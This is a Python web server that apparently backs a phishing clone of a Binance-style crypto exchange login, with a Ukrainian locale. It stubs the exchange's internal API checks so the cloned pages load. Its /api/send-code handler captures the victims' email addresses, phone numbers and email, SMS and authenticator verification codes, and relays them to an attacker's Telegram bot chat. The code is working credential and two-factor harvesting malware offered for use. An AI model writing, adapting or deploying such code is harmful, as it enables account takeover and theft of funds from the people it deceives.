
#!/usr/bin/env python3
import http.server
import socketserver
import json
import os
import requests
import urllib.parse

PORT = 5000

# Telegram bot credentials from environment - NO DEFAULTS FOR SECURITY
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# Check if required environment variables are set
if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
    print("Warning: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables must be set")
    print("Telegram notifications will not work until these are configured")

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        # –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –∫–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        super().end_headers()

    def do_GET(self):
        # –û–±—Ä–æ–±–ª—è—î–º–æ API –∑–∞–ø–∏—Ç–∏
        if self.path.startswith('/bapi/'):
            if 'banner-compliance-check' in self.path:
                self._send_json_response({"success": True, "data": {"show": False}})
            elif 'country-city-short' in self.path:
                self._send_json_response({"country": "UA", "city": "Kyiv"})
            elif 'commonConfig' in self.path:
                self._send_json_response({"success": True, "data": {}})
            elif 'complianceActionCheck' in self.path:
                self._send_json_response({"success": True, "data": {}})
            elif 'businessCheckV2' in self.path:
                self._send_json_response({"success": True, "data": {}})
            elif 'region/language' in self.path:
                self._send_json_response({"success": True, "data": {}})
            elif 'querylangMappingByKey' in self.path:
                self._send_json_response({"success": True, "data": {}})
            elif 'authcenter/auth' in self.path:
                self._send_json_response({"success": True, "data": {}})
            else:
                self._send_json_response({"success": True, "data": {}})
            return
            
        self._process_path()
        
        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —á–∏ —Ñ–∞–π–ª —ñ—Å–Ω—É—î
        file_path = '.' + self.path
        if not os.path.exists(file_path) and not os.path.isdir(file_path):
            # –Ø–∫—â–æ —Ü–µ JS —Ñ–∞–π–ª, –ø–æ–≤–µ—Ä—Ç–∞—î–º–æ –ø–æ—Ä–æ–∂–Ω—ñ–π JS –º–æ–¥—É–ª—å
            if self.path.endswith('.js') or '.js.' in self.path:
                self.send_response(200)
                self.send_header('Content-Type', 'application/javascript')
                self.end_headers()
                self.wfile.write(b'// Module not found')
                return
            # –Ø–∫—â–æ —Ü–µ JSON —Ñ–∞–π–ª, –ø–æ–≤–µ—Ä—Ç–∞—î–º–æ –ø–æ—Ä–æ–∂–Ω—ñ–π JSON
            elif self.path.endswith('.json'):
                self._send_json_response({})
                return
        
        return super().do_GET()
    
    def do_HEAD(self):
        self._process_path()
        return super().do_HEAD()
    
    def do_POST(self):
        # –û–±—Ä–æ–±–ª—è—î–º–æ POST –∑–∞–ø–∏—Ç–∏ –¥–æ API
        if self.path.startswith('/bapi/'):
            self._send_json_response({"success": True, "data": {}})
        elif self.path == '/api/send-code':
            self._handle_send_code()
        else:
            self._send_json_response({"error": "Method not allowed", "code": 405})
    
    def _handle_send_code(self):
        """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –æ—Ç–ø—Ä–∞–≤–∫—É –∫–æ–¥–∞ –≤ Telegram"""
        try:
            # –ß–∏—Ç–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å–∞
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            # –ü–∞—Ä—Å–∏–º JSON –¥–∞–Ω–Ω—ã–µ
            data = json.loads(post_data.decode('utf-8'))
            
            verification_type = data.get('type', 'unknown')
            code = data.get('code', '000000')
            email = data.get('email', '')
            phone = data.get('phone', '')
            
            # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
            if verification_type == 'email':
                message = f"üìß Email –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è\n\nEmail: {email}\n–ö–æ–¥: {code}\n\nüîí –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"
            elif verification_type == 'sms':
                message = f"üì± SMS –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è\n\n–¢–µ–ª–µ—Ñ–æ–Ω: {phone}\n–ö–æ–¥: {code}\n\nüîí –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"  
            elif verification_type == 'authenticator':
                message = f"üîê –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä\n\n–ö–æ–¥: {code}\n\nüîí –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"
            else:
                message = f"üîë –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è\n\n–¢–∏–ø: {verification_type}\n–ö–æ–¥: {code}"
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            telegram_data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message
            }
            
            response = requests.post(telegram_url, json=telegram_data, timeout=10)
            
            if response.status_code == 200:
                self._send_json_response({"success": True, "message": "–ö–æ–¥ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω"})
            else:
                self._send_json_response({"success": False, "error": "–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram"})
                
        except Exception as e:
            # Log error without exposing details
            self._send_json_response({"success": False, "error": "–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏"})

    def _send_json_response(self, data):
        """–í—ñ–¥–ø—Ä–∞–≤–ª—è—î JSON –≤—ñ–¥–ø–æ–≤—ñ–¥—å"""
        response = json.dumps(data).encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.send_header('Content-Length', str(len(response)))
        self.end_headers()
        self.wfile.write(response)
    
    def do_OPTIONS(self):
        """–û–±—Ä–æ–±–ª—è—î–º–æ OPTIONS –∑–∞–ø–∏—Ç–∏ –¥–ª—è CORS"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def _process_path(self):
        # –û–±—Ä–æ–±–ª—è—î–º–æ API –∑–∞–ø–∏—Ç–∏
        if self.path.startswith('/bapi/'):
            return  # –ó–∞–ª–∏—à–∞—î–º–æ —è–∫ —î –¥–ª—è –æ–±—Ä–æ–±–∫–∏ –≤ do_GET
            
        # –ï—Å–ª–∏ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –∫–æ—Ä–µ–Ω—å, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º index.html
        if self.path == '/':
            self.path = '/index.html'
            return
        
        # –£–±–∏—Ä–∞–µ–º –ø—Ä–µ—Ñ–∏–∫—Å /uk-UA/ –µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ –∫–æ—Ä–Ω–µ–≤—ã–µ —Ä–µ—Å—É—Ä—Å—ã
        if self.path.startswith('/uk-UA/'):
            new_path = self.path[7:]  # –£–±–∏—Ä–∞–µ–º "/uk-UA/"
            
            # –î–ª—è –ø—É—Å—Ç–æ–≥–æ –ø—É—Ç–∏ –ø–æ—Å–ª–µ uk-UA
            if new_path == '' or new_path == '/':
                self.path = '/index.html'
            else:
                # –î–ª—è –≤—Å–µ—Ö —Ä–µ—Å—É—Ä—Å–æ–≤ –ø—Ä–æ—Å—Ç–æ —É–±–∏—Ä–∞–µ–º –ø—Ä–µ—Ñ–∏–∫—Å uk-UA
                self.path = '/' + new_path

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    # –î–æ–±–∞–≤–ª—è–µ–º SO_REUSEADDR –¥–ª—è –∏–∑–±–µ–∂–∞–Ω–∏—è "Address already in use"
    class ReuseAddrTCPServer(socketserver.TCPServer):
        allow_reuse_address = True
    
    with ReuseAddrTCPServer(("0.0.0.0", PORT), MyHTTPRequestHandler) as httpd:
        print(f"–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ http://0.0.0.0:{PORT}")
        print("–ù–∞–∂–º–∏—Ç–µ Ctrl+C –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ —Å–µ—Ä–≤–µ—Ä–∞")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
